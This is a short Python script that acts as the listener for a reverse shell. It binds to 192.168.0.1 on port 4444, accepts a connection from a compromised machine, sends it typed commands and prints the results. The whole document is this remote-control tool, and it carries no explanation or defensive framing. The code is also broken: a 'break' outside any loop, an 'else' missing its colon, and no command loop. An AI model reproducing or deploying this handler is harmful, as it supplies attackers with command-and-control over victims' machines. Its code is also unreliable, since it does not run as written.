import socket
import subprocess


def shell():
  command=input("Command: %s" %str(ip))
  target.send(command)
  if command=="q":
      break
  else
      result=target.recv(1024)
      print(result)
     
def server():
      global s
      global ip
      global target
      s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      s.bind(("192.168.0.1", 4444))
      s.listen(5)
      print("Listening to incoming connections...")
      target, ip = s.accept()
      print("Connection established with: %s" %str(ip))
  
server()
shell()
s.close()
